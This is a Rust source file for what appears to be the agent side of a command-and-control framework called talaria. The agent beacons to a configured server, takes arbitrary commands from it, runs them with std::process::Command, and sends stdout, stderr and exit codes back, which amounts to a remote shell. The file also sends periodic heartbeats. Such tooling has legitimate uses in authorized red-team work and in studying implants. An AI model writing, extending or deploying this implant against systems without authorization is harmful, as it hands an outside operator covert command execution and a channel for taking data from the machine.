use crate::agent::AgentContext;
use std::process::{Command, Output};
use talaria::protocol::*;

async fn make_request(
    agent: &mut AgentContext,
    request: AgentResponse,
) -> Option<AgentInstruction> {
    // agent.send_log.push(request.clone());

    let request = AgentResponse::serialize(&request);
    let response = agent
        .http_client
        .post(agent.server_addr.clone() + "/agent/monolith")
        .body(request)
        .send()
        .await;

    match response {
        Ok(response) => {
            let bytes = response.bytes().await.unwrap();
            let instruction = AgentInstruction::deserialize(&bytes.to_vec());
            // agent.rec_log.push(Ok(instruction.clone()));
            Some(instruction)
        }
        Err(error) => {
            // agent.rec_log.push(Err(error));
            None
        }
    }
}

pub async fn handle_response(agent: &mut AgentContext, response: AgentInstruction) {
    match response.instruction {
        AgentInstructionBody::Command {
            ref command,
            ref command_id,
            ref args,
        } => {
            println!(
                "Executing Command: {:?}, ID: {:?}, Args: {:?}",
                command, command_id, args
            );

            // Spawn the command with provided arguments
            let output: Output = Command::new(command).args(args).output().unwrap();

            // Capture stdout, stderr, and status code
            let stdout = String::from_utf8_lossy(&output.stdout).to_string();
            let stderr = String::from_utf8_lossy(&output.stderr).to_string();
            let status_code = output.status.code().unwrap_or(-1); // Fallback to -1 if exit code is not available

            let agent_response = AgentResponse {
                packet_header: agent.generate_packet_header(),
                packet_body: AgentResponseBody::CommandResponse {
                    command: command.to_string(),
                    command_id: *command_id,
                    status_code,
                    stdout,
                    stderr,
                },
            };

            make_request(agent, agent_response).await;
        }
        AgentInstructionBody::RequestHeartbeat => {
            println!("Received heartbeat request from server.");
        }
        AgentInstructionBody::Ok => {
            println!("Server acknowledged previous operation.");
        }
    }

    println!("Processed Response: {:#?}", response);
}

pub async fn send_heartbeat(agent: &mut AgentContext) -> Option<AgentInstruction> {
    let response = AgentResponse {
        packet_header: agent.generate_packet_header(),
        packet_body: AgentResponseBody::Heartbeat,
    };

    return make_request(agent, response).await;
}
